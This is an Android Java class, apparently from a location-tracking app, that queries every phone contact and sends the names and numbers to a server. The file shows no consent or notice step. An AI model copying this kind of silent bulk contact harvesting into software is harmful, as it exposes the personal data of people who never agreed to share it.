package callDetails;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.RequiresApi;

import com.varbin.locationtracker.APIs.CreaterClass;

import java.util.ArrayList;

import synceAdapter.AccountConstants;

public class contactList {
    private static contactPairClass pair;
    @RequiresApi(api = Build.VERSION_CODES.O)
    public static void sendContactToserver(Context contex){
        contactPairClass contacts = getContact(contex);
        boolean flag = AccountConstants.isInactive;
        Log.d("TAG", "onResponse: "+flag);
        CreaterClass.ContactCreater(contacts.name, contacts.number , contex);
       try{
           Thread.sleep(1000);
       }catch (Exception e){

       }
        CreaterClass.inActive("contact_list" , contex);

    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private static contactPairClass getContact(Context contex) {
        pair = new contactPairClass();
        pair.name = new ArrayList<>();
        pair.number = new ArrayList<>();
        ContentResolver contentResolver = contex.getContentResolver();
        String contactId = null;
        String displayName = null;
        ArrayList<contactModel> contactsInfoList = new ArrayList<contactModel>();
        Cursor cursor = contex.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)));
                if (hasPhoneNumber > 0) {

//                    contactModel contactsInfo = new contactModel();
                    contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

//                    contactsInfo.setContactId(contactId);
//                    contactsInfo.setName(displayName);
                    pair.name.add(displayName);

                    Cursor phoneCursor = contex.getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null);

                    if (phoneCursor.moveToNext()) {
                        String phoneNumber = phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

//                        contactsInfo.setContactNumber(phoneNumber);
                        pair.number.add(phoneNumber);
                    }

                    phoneCursor.close();

//                    contactsInfoList.add(contactsInfo);

                }
            }
        }
        cursor.close();
        return pair;
    }
}
